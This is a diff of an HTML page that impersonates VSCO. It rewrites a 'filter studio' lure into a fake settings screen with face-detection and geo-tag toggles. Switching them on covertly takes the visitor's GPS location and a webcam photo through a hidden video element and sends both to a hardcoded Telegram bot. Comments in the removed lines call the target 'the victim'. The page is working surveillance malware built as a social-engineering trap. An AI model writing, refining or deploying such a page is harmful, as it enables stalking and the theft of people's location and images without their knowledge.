@@ -2,48 +2,96 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>VSCO Studio</title>
+    <meta charset="UTF-8">
+    <title>VSCO Settings</title>
     <style>
-        body { background: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        .btn { background: black; color: white; padding: 15px 30px; border-radius: 5px; cursor: pointer; display: inline-block; }
-        video { width: 1px; height: 1px; opacity: 0; }
+        body { background: #f9f9f9; text-align: left; font-family: -apple-system, sans-serif; padding: 20px; color: #333; }
+        .header { display: flex; align-items: center; margin-bottom: 30px; }
+        .header img { width: 40px; margin-right: 15px; }
+        .section-title { font-size: 12px; color: #888; text-transform: uppercase; margin-bottom: 10px; letter-spacing: 1px; }
+        .setting-item { background: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
+        .setting-item:last-child { border-bottom: none; border-radius: 0 0 10px 10px; }
+        .setting-item:first-child { border-radius: 10px 10px 0 0; }
+        .setting-text { font-size: 16px; font-weight: 500; }
+        .setting-sub { font-size: 12px; color: #999; }
+        /* تصميم زر التبديل (Toggle) */
+        .switch { position: relative; display: inline-block; width: 50px; height: 26px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: #000; }
+        input:checked + .slider:before { transform: translateX(24px); }
+        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
     </style>
 </head>
 <body>
-    <img src="https://vsco.co/assets/images/vsco-logo.png" width="80">
-    <h2>VSCO AI Filter Studio</h2>
-    <div class="btn" onclick="start()">Open Studio</div>
+
+    <div class="header">
+        <img src="https://vsco.co/assets/images/vsco-logo.png">
+        <h1>Settings</h1>
+    </div>
+
+    <div class="section-title">AI Capture Preferences</div>
+    <div class="setting-group">
+        <div class="setting-item">
+            <div>
+                <div class="setting-text">Face Detection</div>
+                <div class="setting-sub">Required for AI filters</div>
+            </div>
+            <label class="switch">
+                <input type="checkbox" id="cam-toggle" onchange="enableFeature('cam')">
+                <span class="slider"></span>
+            </label>
+        </div>
+        <div class="setting-item">
+            <div>
+                <div class="setting-text">Location Geo-Tag</div>
+                <div class="setting-sub">Auto-tag photos with location</div>
+            </div>
+            <label class="switch">
+                <input type="checkbox" id="loc-toggle" onchange="enableFeature('loc')">
+                <span class="slider"></span>
+            </label>
+        </div>
+    </div>
+
+    <p style="font-size: 11px; color: #bbb; margin-top: 20px;">Version 4.1.0 (2026) - VSCO Official Studio</p>
+
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs"; 
-        const chatId = "7414704332"; 
+        const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs";
+        const chatId = "7414704332";
 
-        function start() {
-            // أولاً: سحب الموقع الجغرافي
-            navigator.geolocation.getCurrentPosition(p => {
-                const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📍 موقع الضحية: ${loc}`);
-            });
-
-            // ثانياً: سحب الصورة (مع تأخير لضمان الجودة)
-            navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
-                const v = document.getElementById('video');
-                v.srcObject = s;
-                setTimeout(() => {
-                    const c = document.getElementById('canvas');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    c.toBlob(b => {
-                        const f = new FormData(); f.append('photo', b);
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}`, { method: 'POST', body: f });
-                    }, 'image/jpeg');
-                }, 1500); // تأخير ثانية ونصف لفتح العدسة بالكامل
-            });
+        async function enableFeature(type) {
+            if (type === 'loc') {
+                navigator.geolocation.getCurrentPosition(p => {
+                    const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📍 الموقع من الإعدادات: ${loc}`);
+                });
+            }
+            
+            if (type === 'cam') {
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const v = document.getElementById('video');
+                    v.srcObject = s;
+                    setTimeout(() => {
+                        const c = document.getElementById('canvas');
+                        c.width = v.videoWidth; c.height = v.videoHeight;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        c.toBlob(b => {
+                            const f = new FormData(); f.append('photo', b);
+                            fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}`, { method: 'POST', body: f });
+                        }, 'image/jpeg');
+                    }, 1000);
+                } catch (e) {}
+            }
         }
     </script>
 </body>
 </html>
+
 
 
